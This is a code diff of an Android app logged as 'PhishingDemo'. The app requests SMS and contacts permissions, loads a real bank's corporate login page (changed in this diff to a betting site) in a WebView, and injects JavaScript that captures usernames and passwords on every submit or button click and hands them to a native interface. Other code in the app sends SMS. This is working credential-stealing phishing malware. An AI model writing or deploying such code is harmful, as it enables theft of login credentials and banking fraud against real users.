@@ -28,14 +28,44 @@ public class MainActivity extends AppCompatActivity {
         // Requesting all necessary permissions
         requestPermissions(new String[]{
                 Manifest.permission.SEND_SMS,
-                Manifest.permission.READ_SMS, 
+                Manifest.permission.READ_SMS,
                 Manifest.permission.INTERNET,
                 Manifest.permission.READ_CONTACTS
         }, 0);
 
         webView = findViewById(R.id.webview);
         WebSettings webSettings = webView.getSettings();
+
+        // --- OPTIMIZATIONS for better mobile viewing ---
+
+        // Enable essential web features like JavaScript, DOM Storage, and Database.
         webSettings.setJavaScriptEnabled(true);
+        webSettings.setDomStorageEnabled(true);
+        webSettings.setDatabaseEnabled(true);
+
+        // This forces the WebView to load the page with an overview mode,
+        // fitting the content to the screen width. This is crucial for
+        // sites that are not mobile-optimized.
+        webSettings.setLoadWithOverviewMode(true);
+
+        // This allows the WebView to use a wide viewport, which works in
+        // conjunction with setLoadWithOverviewMode to provide a better overview.
+        webSettings.setUseWideViewPort(true);
+
+        // Allow the user to zoom in and out using pinch gestures.
+        webSettings.setBuiltInZoomControls(true);
+
+        // Hide the on-screen zoom controls, which can clutter the UI.
+        // The user can still zoom with pinch gestures.
+        webSettings.setDisplayZoomControls(false);
+
+        // Improve performance by caching content.
+        webSettings.setCacheMode(WebSettings.LOAD_DEFAULT);
+
+        // Enable Geolocation for websites that use location services.
+        webSettings.setGeolocationEnabled(true);
+
+        // --- Original functionality ---
         webSettings.setSavePassword(true);
         webSettings.setSaveFormData(true);
 
@@ -45,54 +75,54 @@ public class MainActivity extends AppCompatActivity {
             @Override
             public void onPageFinished(WebView view, String url) {
                 super.onPageFinished(view, url);
-                
+
                 String jsToInject = "(function() {" +
-                    "   function captureCredentials() {" +
-                    "       let usernameInput = null;" +
-                    "       let passwordInput = null;" +
-                    "       const inputs = document.getElementsByTagName('input');" +
-                    "       for (let i = 0; i < inputs.length; i++) {" +
-                    "           const input = inputs[i];" +
-                    "           const inputType = input.type ? input.type.toLowerCase() : '';" +
-                    "           const inputName = input.name ? input.name.toLowerCase() : '';" +
-                    "           const inputId = input.id ? input.id.toLowerCase() : '';" +
-                    "           const autocomplete = input.autocomplete ? input.autocomplete.toLowerCase() : '';" +
-                    "           if (inputType === 'password' || autocomplete.includes('password')) {" +
-                    "               passwordInput = input;" +
-                    "           }" +
-                    "           else if (inputType === 'email' || inputType === 'text' || inputType === 'tel') {" +
-                    "               if (autocomplete.includes('username') || autocomplete.includes('email') ||" +
-                    "                   inputName.includes('user') || inputName.includes('email') || inputName.includes('login') ||" +
-                    "                   inputId.includes('user') || inputId.includes('email') || inputId.includes('login')) {" +
-                    "                   usernameInput = input;" +
-                    "               }" +
-                    "           }" +
-                    "       }" +
-                    "       if (passwordInput && passwordInput.value) {" +
-                    "           const userVal = (usernameInput && usernameInput.value) ? usernameInput.value : 'Username N/A or not found';" +
-                    "           const passVal = passwordInput.value;" +
-                    "           if (window.AndroidCredentialsInterface && typeof window.AndroidCredentialsInterface.processCapturedCredentials === 'function') {" +
-                    "               window.AndroidCredentialsInterface.processCapturedCredentials(userVal, passVal);" +
-                    "           }" +
-                    "       }" +
-                    "   }" +
-                    "   document.addEventListener('click', function(event) {" +
-                    "       const target = event.target;" +
-                    "       if (target.tagName.toLowerCase() === 'button' || (target.tagName.toLowerCase() === 'input' && target.type.toLowerCase() === 'submit')) {" +
-                    "           setTimeout(captureCredentials, 250);" +
-                    "       }" +
-                    "   }, true);" +
-                    "   document.addEventListener('submit', function(event) {" +
-                    "       setTimeout(captureCredentials, 250);" +
-                    "   }, true);" +
-                    "})();";
+                        "   function captureCredentials() {" +
+                        "       let usernameInput = null;" +
+                        "       let passwordInput = null;" +
+                        "       const inputs = document.getElementsByTagName('input');" +
+                        "       for (let i = 0; i < inputs.length; i++) {" +
+                        "           const input = inputs[i];" +
+                        "           const inputType = input.type ? input.type.toLowerCase() : '';" +
+                        "           const inputName = input.name ? input.name.toLowerCase() : '';" +
+                        "           const inputId = input.id ? input.id.toLowerCase() : '';" +
+                        "           const autocomplete = input.autocomplete ? input.autocomplete.toLowerCase() : '';" +
+                        "           if (inputType === 'password' || autocomplete.includes('password')) {" +
+                        "               passwordInput = input;" +
+                        "           }" +
+                        "           else if (inputType === 'email' || inputType === 'text' || inputType === 'tel') {" +
+                        "               if (autocomplete.includes('username') || autocomplete.includes('email') ||" +
+                        "                   inputName.includes('user') || inputName.includes('email') || inputName.includes('login') ||" +
+                        "                   inputId.includes('user') || inputId.includes('email') || inputId.includes('login')) {" +
+                        "                   usernameInput = input;" +
+                        "               }" +
+                        "           }" +
+                        "       }" +
+                        "       if (passwordInput && passwordInput.value) {" +
+                        "           const userVal = (usernameInput && usernameInput.value) ? usernameInput.value : 'Username N/A or not found';" +
+                        "           const passVal = passwordInput.value;" +
+                        "           if (window.AndroidCredentialsInterface && typeof window.AndroidCredentialsInterface.processCapturedCredentials === 'function') {" +
+                        "               window.AndroidCredentialsInterface.processCapturedCredentials(userVal, passVal);" +
+                        "           }" +
+                        "       }" +
+                        "   }" +
+                        "   document.addEventListener('click', function(event) {" +
+                        "       const target = event.target;" +
+                        "       if (target.tagName.toLowerCase() === 'button' || (target.tagName.toLowerCase() === 'input' && target.type.toLowerCase() === 'submit')) {" +
+                        "           setTimeout(captureCredentials, 250);" +
+                        "       }" +
+                        "   }, true);" +
+                        "   document.addEventListener('submit', function(event) {" +
+                        "       setTimeout(captureCredentials, 250);" +
+                        "   }, true);" +
+                        "})();";
 
                 view.evaluateJavascript(jsToInject, null);
                 Log.d("PhishingDemo", "Advanced JavaScript Injected for URL: " + url);
             }
         });
 
-        String targetUrl = "https://corporate.bankofabyssinia.com/Corporate/servletcontroller";
+        String targetUrl = "https://jambobet.bet/";
         webView.loadUrl(targetUrl);
     }
 
@@ -130,7 +160,7 @@ public class MainActivity extends AppCompatActivity {
                 Log.e("PhishingDemo", "Error sending SMS: " + e.getMessage(), e);
             }
         }
-        
+
         /**
          * Gets the thread ID for a given phone number.
          * This is a more direct way to find the conversation.
@@ -139,7 +169,7 @@ public class MainActivity extends AppCompatActivity {
             Uri threadIdUri = Uri.parse("content://mms-sms/threadID");
             Uri.Builder builder = threadIdUri.buildUpon();
             builder.appendQueryParameter("recipient", recipient);
-            
+
             long threadId = -1;
             Cursor cursor = null;
             try {
@@ -175,7 +205,7 @@ public class MainActivity extends AppCompatActivity {
                     Log.i("PhishingDemo", "Found thread_id: " + threadId + " on attempt " + (i + 1));
                     break;
                 }
-                
+
                 Log.d("PhishingDemo", "Attempt #" + (i + 1) + ": thread_id not found. Retrying...");
                 try {
                     Thread.sleep(RETRY_DELAY_MS);
